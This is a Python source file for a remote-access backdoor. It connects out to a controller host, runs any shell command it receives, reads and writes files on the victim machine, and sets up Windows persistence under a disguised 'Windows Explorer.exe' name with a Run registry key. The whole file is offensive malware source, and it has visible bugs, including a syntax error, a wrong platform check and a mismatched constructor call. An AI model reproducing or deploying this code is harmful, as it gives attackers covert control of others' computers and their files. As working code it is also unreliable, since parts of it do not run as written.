#!/usr/bin/env python

import socket
import subprocess
import json
import os 
import base64
import sys
import shutil
import time
import platform

class Backdoor:
    def __init__(self, controller_ip, port, persistence=False):
        self.persistence = persistence
        self.os = os
        if (persistence == True):
            self.persist()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((controller_ip, port))
    
    def persist(self):
        """
        Rather poor persistence method. Need to update.
        """
        if (platform == "win32" or platform == "cygwin"):
            # Windows or __file__ DO NOT PERSIST IF EMBEDDED INSIDE OF ANOTHER FILE 
            location = os.environ["appdata"] + "\\Windows Explorer.exe"
            if (not os.path.exists(location)):
                shutil.copyfile(sys.executable, location)
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"',shell=True)
        if (if platform == "darwin"):
            pass
        if (platform == "linux" or platform == "linux2"):
            home_config_dir = os.path.expanduser('~') + "/.config/"
            autostart_path = home_config_dir + "/autostart/"
            autostart_file = autostart_path + "xinput.desktop"
            if not os.path.isfile(autostart_file):
                try:
                    os.makedirs(autostart_path)
                except OSError:
                    pass

    def serialize(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
    
    def deserialize(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError: # more data
                continue

    def execute_system_cmd(self, cmd):
        # return subprocess.check_output(cmd, shell=True)
        DEVNULL = open(os.devnull, "wb")
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=DEVNULL, stdin=DEVNULL)
        proc_output = proc.communicate()[0]
        return proc_output

    def change_working_dir(self, path):
        os.chdir(path)
        return "[+] Navigating to directory {i}".format(i=path)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content)) # encapsulate all unknown chars
            return "[+] Successfully uploaded file {i} from host.".format(i=path)
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            cmd = self.deserialize()
            try:
                if (cmd[0] == "exit"):
                    self.connection.close()
                    sys.exit()
                elif (cmd[0] == "cd" and len(cmd) > 1): 
                    cmd_res = self.change_working_dir(cmd[1])
                elif (cmd[0] == "download" and len(cmd) > 1): 
                    cmd_res = self.read_file(cmd[1])
                elif (cmd[0] == "upload" and len(cmd) > 1): 
                    cmd_res = self.write_file(cmd[1], cmd[2])
                else:
                    cmd_res = self.execute_system_cmd(cmd)
            except Exception as i:
                cmd_res = "[-] An error occurred during command execution. see {i}".format(i=i)
            self.serialize(cmd_res)

while True:
    try:
        backdoor = Backdoor(CONTROLLER_IP, PORT, PERSIST_BOOL, OS)
        backdoor.run()
    except Exception:
        time.sleep(3600)
        continue
    # except socket.error:
    #     continue

